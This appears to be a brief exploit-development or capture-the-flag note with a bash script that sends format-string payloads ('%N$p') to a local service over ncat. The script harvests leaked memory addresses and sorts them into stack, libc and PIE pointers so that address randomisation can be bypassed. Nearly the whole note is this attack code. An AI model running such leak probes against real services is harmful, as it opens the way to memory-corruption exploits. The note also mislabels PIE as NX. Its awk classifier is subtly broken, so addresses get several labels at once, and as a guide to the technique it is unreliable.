"FUZZING" libc

we have a position-independent executable (NX) and therefore need to check the address in memory first.
here is a little script to get the libc addresses.


cat fuzzy.sh
#!/usr/bin/env bash

HOST="127.0.0.1"
PORT="1234"

send() {
    printf "%b" "$1" | ncat "$HOST" "$PORT"
}

extract() {
    echo "$1" | grep -oE "0x[0-9a-fA-F]+|\(nil\)"
}

classify() {
    echo "$1" | awk '
    /0x7ff/ {print "[stack] " $0}
    /0x7f/  {print "[libc ] " $0}
    /0x55/  {print "[pie  ] " $0}
    {print "[?]    " $0}
    '
}

logfile="leaks.log"
> "$logfile"

echo "[*] Starting leak inspection..."

for i in $(seq 1 3 180); do
    payload=$(printf "DEBUG %%%d\$p.%%%d\$p.%%%d\$p\n" \
        $i $((i+1)) $((i+2)))

    resp=$(send "$payload")

    leaks=$(extract "$resp")

    echo "[$i] $payload"
    classify "$leaks"

    echo "[$i] $resp" >> "$logfile"
    echo "-----------------------------"
done

echo "[*] Done. Saved raw output to $logfile"


